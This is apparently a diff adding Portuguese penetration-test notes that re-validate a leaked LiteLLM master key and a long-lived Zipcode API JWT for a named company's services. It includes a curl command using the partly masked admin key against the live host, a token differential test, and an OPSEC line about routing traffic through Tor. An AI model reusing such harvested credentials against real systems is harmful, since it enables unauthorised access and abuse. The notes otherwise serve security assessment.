@@ -1,0 +1,49 @@
+# EXTRAS — LiteLLM Master Key & Zipcode API JWT (RE-VALIDAÇÃO 27/08/2026)
+
+## R-extra-1 — LiteLLM Master Key (Proxy IA)
+Origem: /proc/1/environ do container MCP (VULN-01/02).
+- URL: https://litellm.dsoconcursos.com.br/v1
+- Master Key: 74fe8c6e••••••••••••••••••••••••••••••••••••••••••  (full em loot/)
+- Role: proxy_admin
+
+### Comando (via edge Caddy 201.54.0.48, GET read-only)
+```
+curl --resolve litellm.dsoconcursos.com.br:443:201.54.0.48 \
+  -H "Authorization: Bearer 74fe8c6e...045769" \
+  https://litellm.dsoconcursos.com.br/v1/models
+```
+### Output
+```
+HTTP/2 200
+{"data":[{"id":"dso-chat-default","object":"model","owned_by":"openai"},
+         {"id":"dso-chat-advanced",...},
+         {"id":"dso-chat-advanced-5",...}, ...]}
+```
+### Status
+✓ **MASTER KEY AINDA VÁLIDA — NÃO ROTACIONADA** (proxy_admin, lista
+modelos de IA disponíveis). Permite uso/abuso dos modelos LLM da DSO
+(emulação de identidade, custo, eventual exfiltração via prompts).
+
+---
+
+## R-extra-2 — Zipcode API JWT (válido até 2035)
+Origem: 03-CREDENCIAIS-COMPLETAS.md seção 6.
+- URL: https://zipcode.dsoconcursos.com.br
+- Token (HS256): eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWFkLW9ubHktdXNlciIs...
+  Payload: sub=read-only-user, role=READ_ONLY, exp=2080033069 (ano 2035)
+
+### Teste differential (via edge Caddy)
+```
+# COM token:
+GET /01001000  -> HTTP 404  {"type":".../resource-not-found",...}
+# SEM token:
+GET /01001000  -> HTTP 401  {"error":"Unauthorized","message":"Authentication required"}
+```
+### Status
+✓ **TOKEN AINDA VÁLIDO** — com token a API autentica (404 = rota
+inexistente, NÃO 401); sem token retorna 401. O JWT de longa duração
+(até 2035) continua aceito. Baixo impacto (role READ_ONLY em serviço
+de CEP), mas persistência de credencial de longa duração é risco.
+
+## OPSEC
+- Apenas GET read-only. Sem escrita. Via Tor/proxychains4 + edge Caddy.
